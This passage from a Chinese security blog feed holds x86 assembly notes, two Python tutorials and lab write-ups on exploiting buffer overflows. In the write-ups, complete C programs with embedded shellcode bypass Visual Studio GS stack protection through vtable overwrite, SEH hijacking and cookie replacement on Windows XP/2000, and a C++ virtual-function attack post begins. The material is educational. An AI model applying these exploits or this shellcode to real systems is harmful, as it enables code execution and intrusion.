<pre><code>
<font color="#f00">jmp长跳</font>
\xE9\x2B\xFF\xFF\xFF\xFF: jmp 0x0012FF30

在Asm2MachineCode(x86)中如果要尝试jmp short $-8，是不可能实现的，但是我们可以：
1. ImageBase（hex）设置为0012ff58 <font color="#f00">(此处为当前的EIP地址)</font>
2. jmp 0012FE88

</code></pre>

<h3 id="5-cmp"><a href="#5-cmp" class="headerlink" title="5. cmp"></a>5. cmp</h3><p>cmp op1, op2</p>
<p>ZF=1 这个简单，则说明两个数相等</p>
<p>当无符号时：<br>CF=1 则说明了有进位或借位，cmp是进行的减操作，故可以看出为借位，所以，此时oprd1&lt;oprd2<br>CF=0 则说明了无借位，但此时要注意ZF是否为0，若为0，则说明结果不为0，故此时oprd1&gt;oprd2</p>
<p>当有符号时：<br>若SF=0，OF=0 则说明了此时的值为正数，没有溢出，可以直观的看出，oprd1&gt;oprd2<br>若SF=1，OF=0 则说明了此时的值为负数，没有溢出，则为oprd1&lt;oprd2<br>若SF=0，OF=1 则说明了此时的值为正数，有溢出，可以看出oprd1&lt;oprd2<br>若SF=1，OF=1则说明了此时的值为负数，有溢出，可以看出oprd1&gt;oprd2</p>
<p>最后两个可以作出这种判断的原因是，溢出的本质问题：<br>两数同为正，相加，值为负，则说明溢出<br>两数同为负，相加，值为正，则说明溢出<br>故有，正正得负则溢出，负负得正则溢出</p>
<h3 id="6-leave"><a href="#6-leave" class="headerlink" title="6. leave"></a>6. leave</h3><p>leave在32位汇编下相当于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov esp,ebp                                            </div><div class="line">pop ebp</div></pre></td></tr></table></figure>
<h3 id="7-les"><a href="#7-les" class="headerlink" title="7. les"></a>7. les</h3><p>LES( load ES)指令的功能是：把内存中指定位置的双字操作数的低位字装入指令中指定的寄存器、高位字装入ES寄存器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">LES DSET，SRC</div><div class="line">LES REG，MEM</div><div class="line">DEST为destination(目的地址)，SRC为source(源地址)；</div><div class="line">REG为register(CPU寄存器)，MEM为memory(内存地址)。</div></pre></td></tr></table></figure>
<p>DEST=WORD PTR[SRC]</p>
<p>ES=WORD PTR[SRC+2]</p>
<p>DEST赋值为SRC处双字的低位；</p>
<p>ES赋值为SRC处双字的高位；</p>
<h3 id="8-比较"><a href="#8-比较" class="headerlink" title="8. 比较"></a>8. 比较</h3><p>A（above）大于、B（below）小于、E（equal）等于，用于比较无符号数</p>
<p>G（great）大于、L（less than）小于、E（equal）等于，用于比较带符号数</p>
<p>其实这些地方也是漏洞点，有时候比较没有对是否有符号进行确定，所以可能会出问题。</p>
<h3 id="9-lods-stos"><a href="#9-lods-stos" class="headerlink" title="9. lods/stos"></a>9. lods/stos</h3><p>lodsb指令，将esi指向的地址处的数据取出来赋给AL寄存器, esi=esi+1；</p>
<p>lodsw指令则取得是一个字。</p>
<p>lodsd指令，取得是双字节，即mov eax，[esi]，esi=esi+4；</p>
<p>stosb指令，将AL寄存器的值取出来赋给edi所指向的地址处。mov [edi]，AL；edi=edi+1；</p>
<p>stosw指令去的是一个字。</p>
<p>stosd指令，取得是双字节，mov [edi]，eax；edi=edi+4；</p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[绕过GS安全编译的方法]]></title>
      <url>/2017/07/04/%E7%BB%95%E8%BF%87GS%E5%AE%89%E5%85%A8%E7%BC%96%E8%AF%91%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-介绍GS"><a href="#1-介绍GS" class="headerlink" title="1.介绍GS"></a>1.介绍GS</h3><p>VS设置GS开启：Project-&gt;project Properties-&gt;Configuration Properties-&gt;C/C++-&gt;Code Generation-&gt;Buffer Security Check</p>
<h4 id="1-1-GS工作原理"><a href="#1-1-GS工作原理" class="headerlink" title="1.1 GS工作原理"></a>1.1 GS工作原理</h4><ul>
<li>在所有函数调用发生时，向栈帧中压入额外的随机DWORD，这个随机数被称作&quot;canary&quot;，在IDA中被标注为“Security Cookie”。</li>
<li>Security Cookie位于EBP之前，系统还将.data的内存区域中存放一个Security Cookie副本</li>
<li>当栈发生溢出时，Security Cookie将被首先淹没，之后才是EBP和返回地址</li>
<li>在函数返回之前，系统将执行额外的安全验证操作，即Security Check</li>
<li>在Security Check过程中，系统将比较栈中原先存放的Security Cookie和.data中副本的值，如果两者不吻合，说明栈帧中的Security Cookie已被破坏，即栈中已经溢出</li>
<li>当检测处溢出时，系统将进入异常处理流程，函数不会被正常返回，ret指令也不会被执行</li>
</ul>
<p><img src="/images/2017-07-04/gs.jpg" alt="GS内存格局"></p>
<h4 id="1-2-不会使用GS的情况"><a href="#1-2-不会使用GS的情况" class="headerlink" title="1.2 不会使用GS的情况"></a>1.2 不会使用GS的情况</h4><ol>
<li>函数不包括缓冲区</li>
<li>函数被定义为具有变量参数列表</li>
<li>函数使用无保护的关键字标记</li>
<li>函数在第一个语句中包含内嵌汇编代码</li>
<li>缓冲区不是8字节类型且大小不大于4字节</li>
</ol>
<p>当然，也可以使用#pragma strict_gs_check(on)为任意类型的函数添加Security Cookie。</p>
<h4 id="1-3-其他栈保护措施"><a href="#1-3-其他栈保护措施" class="headerlink" title="1.3 其他栈保护措施"></a>1.3 其他栈保护措施</h4><p>VS 2005及后续版本使用了变量重排技术，在编译时根据局部变量的类型对变量在栈帧中的位置进行调整，将字符串变量移动到栈帧的高地址。这样可以防止该字符串溢出时破坏其他的局部变量，同时还会将指针参数的字符串参数复制到内存中的低地址，防止函数参数被破坏。</p>
<p><img src="/images/2017-07-04/gs_relocate.jpg" alt="GS重排技术"></p>
<h4 id="1-4-Security-Cookie生成细节"><a href="#1-4-Security-Cookie生成细节" class="headerlink" title="1.4 Security Cookie生成细节"></a>1.4 Security Cookie生成细节</h4><ul>
<li>系统以.data节的第一个双字作为Cookie的种子，或原始Cookie（所有函数的Cookie都用这个DWORD生成）</li>
<li>在程序每次运行时Cookie的种子都不同，因此种子具有很强的随机性</li>
<li>在栈帧初始化以后系统用ESP异或种子，作为当前函数的Cookie，以此作为不同函数之间的区别，并增加 Cookie的随机性</li>
<li>在函数返回前，用ESP还原出（异或）Cookie的种子</li>
</ul>
<h4 id="1-5-GS优缺点"><a href="#1-5-GS优缺点" class="headerlink" title="1.5 GS优缺点"></a>1.5 GS优缺点</h4><ol>
<li>修改栈帧中函数返回地址的经典攻击将被GS机制有效遏制</li>
<li>基于改写函数指针的攻击，如C++虚函数的攻击，GS机制仍然很难防御</li>
<li>针对异常处理机制的攻击，GS很难防御</li>
<li>GS是对栈帧的保护机制，因此很难防御堆溢出的攻击</li>
</ol>
<h3 id="2-利用未保护的内存突破GS"><a href="#2-利用未保护的内存突破GS" class="headerlink" title="2. 利用未保护的内存突破GS"></a>2. 利用未保护的内存突破GS</h3><p>这其实在前面已经介绍过，当缓冲区不是8字节类型且大小不大于4字节，系统是不会给予GS保护的，这时候就可以使用栈或堆溢出</p>
<h3 id="3-覆盖虚函数突破GS"><a href="#3-覆盖虚函数突破GS" class="headerlink" title="3. 覆盖虚函数突破GS"></a>3. 覆盖虚函数突破GS</h3><h4 id="3-1-测试代码"><a href="#3-1-测试代码" class="headerlink" title="3.1 测试代码"></a>3.1 测试代码</h4><pre><code>
#include "stdafx.h"
#include "string.h"

class GSVirtual{
public:
    void gsv(char *src)
    {
        char buf[200];
        strcpy(buf, src);
        vir();
    }
    virtual void vir()
    {
    }
};

int main()
{
    GSVirtual test;
    test.gsv(
    "\xfc\x5e\x97\x7c\x90\x90\x90\x90\x90\x90\x90\x90\xb0\x9d\x93\x7c"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
    "\xF0\x20\x40\0"
    );
    return 0;
}

</code></pre>

<font color="#f00">说明：shellcode中头部的0x7c992b04为&quot;pop edi, pop esi, retn&quot;指令的地址，不同版本的系统中该地址可能不同</font>


<h4 id="3-2-实验原理"><a href="#3-2-实验原理" class="headerlink" title="3.2 实验原理"></a>3.2 实验原理</h4><p>实验思路：</p>
<ol>
<li>类GSVirtual中的gsv函数存在典型的栈溢出漏洞</li>
<li>类GSVirtual中包含一个虚函数vir</li>
<li>当gsv中的buf变量发生溢出的时候有可能影响虚表指针，如果可以控制虚表指针，将其指向我们可以控制的内存空间，就可以在程序调用时控制程序的流程。</li>
</ol>
<p>实验环境</p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td></td>
</tr>
<tr>
<td>编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td><font color="#f00">禁用优化选项</font></td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
<p>为了能够精准地淹没虚函数表，test.gsv中传入参数&quot;\x90&quot;*199+&quot;\0&quot;，在执行strcpy之后暂停<br>此时栈帧内容为<br><img src="/images/2017-07-04/gs_stack.jpg" alt="传入参数后的栈帧内容"></p>
<p>从栈帧中可以看出，距离虚函数表地址还有20字节的内容。然后考虑一下执行过程，控制虚表指针后，可以<font color="#f00">让程序跳到虚表指针指向的虚表函数地址中去执行（即jmp [虚表指针内容]）</font>。过程如图，程序根据虚表指针找到虚表，然后从虚表中取出调用的虚函数地址，根据这个地址转入虚函数执行。</p>
<p><img src="/images/2017-07-04/gs_stack2.jpg" alt="虚函数执行过程"></p>
<p>变量buff在内存中的位置不是固定的，需要考虑如何让虚表指针刚好指向shellcode的范围内。虽然原始参数为（0x004020F0）是位于虚表（0x004021C0）附近，所以我们直接淹没虚表地址。</p>
<p>虚表指针指向原始参数中的shellcode后，紧跟着一个call操作，也就是说还需要在执行这个call后还必须返回shellcode空间继续执行，这儿有个办法就是直接进入栈空间中的buff内执行shellcode。<br><img src="/images/2017-07-04/gs_stack3.jpg" alt="进入call之后的内存空间"></p>
<p>从图中可以看出，此时Buff的地址存放在0x0012FE9C，位于ESP+4的位置，我们只要执行&quot;pop pop retn&quot;指令序列后就可以转到0x0012FE9C中执行。我们找到了ntdll.dll在0x7C975EFC处的&quot;pop esi, pop edi, retn&quot;指令。</p>
<p>但是在虚函数执行此地址处的函数指令的时候，retn之后会重新跳入栈顶指针0x7C975EFC处继续执行一遍&quot;pop esi, pop edi, retn&quot;指令</p>
<p><img src="/images/2017-07-04/gs_stack4.jpg" alt="第一次执行&quot;pop pop retn&quot;之后"></p>
<p>为了能够让程序执行shellcode中关键内容，我们让这次执行&quot;pop pop retn&quot;后程序进入ntdll.dll中0x7c939db0中执行&quot;push esp, retn&quot;指令<br><img src="/images/2017-07-04/gs_stack5.jpg" alt="第二次执行&quot;pop pop retn&quot;之后"></p>
<p>这时候执行push esp就将shellcode中的地址传入栈中，然后retn后就执行shellcode中内容</p>
<font color="#f00">本次执行的过程与《0day安全》上讲的不一样，总觉得书上这个地方讲错了</font>

<h3 id="4-攻击异常处理突破GS"><a href="#4-攻击异常处理突破GS" class="headerlink" title="4. 攻击异常处理突破GS"></a>4. 攻击异常处理突破GS</h3><h4 id="4-1-测试代码"><a href="#4-1-测试代码" class="headerlink" title="4.1 测试代码"></a>4.1 测试代码</h4><pre><code>
#include "stdafx.h"
#include "string.h"

char shellcode[] = 
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xA0\xFE\x12\x00";


void test(char *input)
{
    char buf[200];
    strcpy(buf, input);
    strcat(buf, input);
}

int main()
{
    test(shellcode);
}
</code></pre>

<h4 id="4-2-实验原理"><a href="#4-2-实验原理" class="headerlink" title="4.2 实验原理"></a>4.2 实验原理</h4><p>实验思路</p>
<ol>
<li>函数test存在典型的栈溢出漏洞</li>
<li>在strcpy操作后变量buf会被溢出，当字符串足够长的时候程序的SEH异常处理句柄会被淹没</li>
<li>由于strcpy溢出，覆盖了input的地址，会造成strcat从一个非法地址读取错误，这会触发异常，程序进入异常处理，这样就可以在程序检查Security Cookie前将程序流程劫持</li>
</ol>
<p>实验环境</p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows 2000 SP4</td>
<td></td>
</tr>
<tr>
<td>编译器</td>
<td>Visual Studio 2005</td>
<td>Windows 2000最高支持VS2005</td>
</tr>
<tr>
<td>编译选项</td>
<td><font color="#f00">禁用优化选项</font></td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
<p>测试步骤</p>
<ol>
<li>首先用&quot;\x90&quot;*199+&quot;\0&quot;作为shellcode，按照实验环境编译，用OllyDbg加载程序，在程序执行strcpy后中断程序<br>执行完之后，发现shellcode起始位置为0x0012FEA0，距离栈顶最近的SEH位于0x0012FFb0+4。于是知道shellcode起始位置到最近的SEH句柄需要276字节。</li>
<li>shellcode: 168字节弹出对话框shellcode + 108*&quot;\x90&quot; + &quot;\xA0\xFE\x12\x00&quot;</li>
</ol>
<h3 id="5-同时替换栈中和-data中的Cookie突破GS"><a href="#5-同时替换栈中和-data中的Cookie突破GS" class="headerlink" title="5. 同时替换栈中和.data中的Cookie突破GS"></a>5. 同时替换栈中和.data中的Cookie突破GS</h3><h4 id="5-1-实验代码"><a href="#5-1-实验代码" class="headerlink" title="5.1 实验代码"></a>5.1 实验代码</h4><pre><code>
#include "stdafx.h"
#include "string.h"
#include "stdlib.h"

char shellcode[] = 
    "\x90\x90\x90\x90"    // new value of cookie in .data
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xF4\x6F\x82\x90"    // result of \x90\x90\x90\x90 xor EIP
    "\x90\x90\x90\x90"
    "\x94\xFE\x12\x00";  // address of shellcode 

void test(char *s, int i, char *src)
{
    char dest[200];
    if(i&lt;0x9995)
    {
        char *buf = s+i;
        *buf = *src;
        *(buf+1) = *(src+1);
        *(buf+2) = *(src+2);
        *(buf+3) = *(src+3);
        strcpy(dest, src);
    }
}
void main()
{
    char *str = (char *)malloc(0x10000);
    test(str, 0xffff3094, shellcode);
}
</code></pre>

<h4 id="5-2-实验原理"><a href="#5-2-实验原理" class="headerlink" title="5.2 实验原理"></a>5.2 实验原理</h4><p>实验思路：</p>
<ol>
<li>main函数在堆中申请了0x10000字节的空间，并通过test函数对其空间的内容尽心操作</li>
<li>test函数对s+i到s+i+3的内存进行赋值，虽然函数对i进行了上限判断，但是没有判断i是否大于0，当i为负值时，s+i所指向的空间就会脱离main中申请的空间，进而有可能会指向.data区域</li>
<li>test函数中的strcpy存在典型的溢出漏洞</li>
</ol>
<p>实验环境</p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td></td>
</tr>
<tr>
<td>编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td><font color="#f00">禁用优化选项</font></td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
<p>Security Cookie校验过程：</p>
<ol>
<li>shellcode赋值为8*&quot;\x90&quot;，然后使用OllyDbg加载 运行程序，并中断在test函数中的if语句处，此实验中该语句地址0x00401013</li>
<li><font color="#f0f">如下图所示，程序从0x0040300C(<strong>security_cookie)处取出Cookie值，然后与EBP做一次异或，最后将异或之后的值放到EBP-4的位置作为次函数的Security Cookie。函数返回前的校验过程就是此过程的逆过程：程序从EBP-4的位置取出值，然后与EBP异或，最后与0x0040300C(</strong>security_cookie)处的Cookie进行比较，如果两者一致则校验通过，否则转入校验失败的异常处理。</font><font color="#0f0">由于__security_cookie会随着实验而进行改变，所以此处可能会改变。在后面的实验中发现，这个地方的值为0x004030DC，所以得读者自己进行测试</font><br><img src="/images/2017-07-04/rip_gs.jpg" alt="Security Cookie生成过程"></li>
<li>实验关键点就是在0x004030DC处写入我们的数据，而我们在main函数中通过malloc申请的空间起始位置是0x00410048<font color="#f00">将程序中断在malloc之后，call MALLOC之后，函数会将申请的空间起始地址保存在EAX并返回</font>。这个位置相对于0x00403000处于高址位置，可以通过向test函数中i参数传递一个负值来将指针str向0x00403000方向移动，通过计算得到i应设置为0xffff3094(-53100)就可以将str指向0x004030DC。</li>
<li>将程序重新编译后，在strcpy处中断。此时0x004030DC被覆盖为0x90909090。将0x90909090与当前EBP异或的结果放到Security Cookie位置即可。此时异或的结果为0x90826FF4。</li>
<li>调试发现dest起始位置为0x0012FE94，Security Cookie位于0x0012FF60，返回地址位于0x0012FF68.</li>
<li>shellcode组成： &quot;\x90\x90\x90\x90&quot;修改.data中Cookie + 168字节弹出对话框 + 32*&quot;\x90&quot; + &quot;\xF4\x6F\x82\x90&quot;Security Cookie + &quot;\x90\x90\x90\x90\x94\xFE\x12\x00&quot; 填充和返回地址覆盖</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> GS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[详解python中xlrd包的安装与处理Excel表格]]></title>
      <url>/2017/07/03/%E8%AF%A6%E8%A7%A3python%E4%B8%ADxlrd%E5%8C%85%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%A4%84%E7%90%86Excel%E8%A1%A8%E6%A0%BC/</url>
      <content type="html"><![CDATA[<h3 id="1-安装xlrd"><a href="#1-安装xlrd" class="headerlink" title="1. 安装xlrd"></a>1. 安装xlrd</h3><pre><code>
pip install xlrd
</code></pre>

<h3 id="2-python处理excel表格"><a href="#2-python处理excel表格" class="headerlink" title="2. python处理excel表格"></a>2. python处理excel表格</h3><h4 id="2-1-打开excel表格"><a href="#2-1-打开excel表格" class="headerlink" title="2.1 打开excel表格"></a>2.1 打开excel表格</h4><pre><code>
# -*- coding: utf-8 -*-
import xlrd

# 获取一个Book对象
book = xlrd.open_workbook("1.xls")

# 获取一个sheet对象的列表
sheets = book.sheets()

# 遍历每一个sheet，输出这个sheet的名字（如果是新建的一个xls表，可能是sheet1、sheet2、sheet3）
for sheet in sheets:
    print(sheet.name)

</code></pre>

<p>open_workbook(): 打开工作簿，这就打开了Excel表。</p>
<p>返回的是一个Book对象，通过Book对象我们可以获得一个Sheet的列表，上面的程序就简单地把每个sheet的名字都输了出来。</p>
<h4 id="2-2-读出指定单元格内的数据"><a href="#2-2-读出指定单元格内的数据" class="headerlink" title="2.2 读出指定单元格内的数据"></a>2.2 读出指定单元格内的数据</h4><pre><code>
# -*- coding: utf-8 -*-
import xlrd

# 获取一个Book对象
book = xlrd.open_workbook("1.xls")

# 获取一个sheet对象的列表
sheets = book.sheets()

# 遍历每一个sheet，输出这个sheet的名字（如果是新建的一个xls表，可能是sheet1、sheet2、sheet3）
for sheet in sheets: 
    print(sheet.cell_value(0, 0))

</code></pre>

<p>读出单元格内数据函数 cell_value(row, col) ，行列均从0起。</p>
<p>除此之外，可以通过：</p>
<font color="#f00">sheet.cell(row, col) # 获取单元格对象<br>sheet.cell_type(row, col) # 获取单元格类型<br></font>

<h4 id="2-3-读取日期数据"><a href="#2-3-读取日期数据" class="headerlink" title="2.3 读取日期数据"></a>2.3 读取日期数据</h4><pre><code>
# -*- coding: utf-8 -*-
from datetime import datetime 
from xlrd import xldate_as_tuple

# 获取一个Book对象
book = xlrd.open_workbook("1.xls")

# 获取一个sheet对象的列表
sheets = book.sheets()

timeVal = sheets[0].cell_value(0,0)

timestamp = datetime(*xldate_as_tuple(timestamp, 0))

print(timestamp)

</code></pre>

<p>如果Excel存储的某一个单元格数据是日期的话，需要进行一下处理，转换为datetime类型</p>
<h4 id="2-4-遍历每行的数据"><a href="#2-4-遍历每行的数据" class="headerlink" title="2.4 遍历每行的数据"></a>2.4 遍历每行的数据</h4><pre><code>
rows = sheet.get_rows()
for row in rows:
    print(row[0].value) # 输出此行第一列的数据
</code></pre>]]></content>
      
        <categories>
            
            <category> misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
            <tag> excel </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python用模块zlib压缩与解压字符串和文件的方法]]></title>
      <url>/2017/07/02/python%E7%94%A8%E6%A8%A1%E5%9D%97zlib%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>python中zlib模块是用来压缩或者解压缩数据，以便保存和传输。它是其他压缩工具的基础。下面来一起看看python用模块zlib压缩与解压字符串和文件的方法。话不多说，直接来看示例代码。</p>
<h3 id="1-压缩与解压字符串"><a href="#1-压缩与解压字符串" class="headerlink" title="1. 压缩与解压字符串"></a>1. 压缩与解压字符串</h3><pre><code>
import zlib
message = 'abcd1234'
compressed = zlib.compress(message)
decompressed = zlib.decompress(compressed)

print 'original:', repr(message)
print 'compressed:', repr(compressed)
print 'decompressed:', repr(decompressed)
</code></pre>

<p><b>结果</b></p>
<pre><code>
original: 'abcd1234'
compressed: 'x\x9cKLJN1426\x01\x00\x0b\xf8\x02U'
decompressed: 'abcd1234'
</code></pre>

<h3 id="2-压缩与解压文件"><a href="#2-压缩与解压文件" class="headerlink" title="2. 压缩与解压文件"></a>2. 压缩与解压文件</h3><pre><code>
import zlib
def compress(infile, dst, level=9):
    infile = open(infile, 'rb')
    dst = open(dst, 'wb')
    compress = zlib.compressobj(level)
    data = infile.read(1024)
    while data:
        dst.write(compress.compress(data))
        data = infile.read(1024)
    dst.write(compress.flush())

def decompress(infile, dst):
    infile = open(infile, 'rb')
    dst = open(dst, 'wb')
    decompress = zlib.decompressobj()
    data = infile.read(1024)
    while data:
        dst.write(decompress.decompress(data))
        data = infile.read(1024)
    dst.write(decompress.flush())

if __name__ == "__main__":
    compress('in.txt', 'out.txt')
    decompress('out.txt', 'out_decompress.txt')
</code></pre>

<h3 id="3-问题——处理对象过大异常"><a href="#3-问题——处理对象过大异常" class="headerlink" title="3. 问题——处理对象过大异常"></a>3. 问题——处理对象过大异常</h3><pre><code>
>>> import zlib
>>> a = '123'
>>> b = zlib.compress(a)
>>> b
'x\x9c342\x06\x00\x01-\x00\x97'
>>> a = 'a' * 1024 * 1024 * 1024 * 10
>>> b = zlib.compress(a)
Traceback (most recent call last):
 File "&lt;stdin&gt;", line 1, in &lt;module&gt;
OverflowError: size does not fit in an int
</code></pre>]]></content>
      
        <categories>
            
            <category> misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
            <tag> zlib </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻击C++的虚函数]]></title>
      <url>/2017/07/01/%E6%94%BB%E5%87%BBC-%E7%9A%84%E8%99%9A%E5%87%BD%E6%95%B0/</url>
      <content type="html"><![CDATA[<h3 id="C-简介"><a href="#C-简介" class="headerlink" title="C++简介"></a>C++简介</h3><p><b>理解虚函数和虚表</b></p>
<ol>
<li>C++类的成员函数声明时，若使用关键字virtual进行修饰，则被称为虚函数</li>
<li>一个类中可能有多个虚函数</li>
<li>虚函数的入口地址统一保存在虚表(Vtable)之中</li>
<li><p>对象在使用虚函数时，首先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用</p>
</li>
<li><font color="#f00">虚表指针保存在对象的内存空间中，紧接着虚表指针的是其他成员变量</font>
</li>
<li><p>虚函数只有通过对象指针的引用才能显示其动态调用的特性。</p>
</li>
</ol>
<h3 id="C-虚函数的利用"><a href="#C-虚函数的利用" class="headerlink" title="C++虚函数的利用"></a>C++虚函数的利用</h3><p>实验代码：</p>
<pre><code>
#include "windows.h"
#include "iostream.h"

char shellcode[] =
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
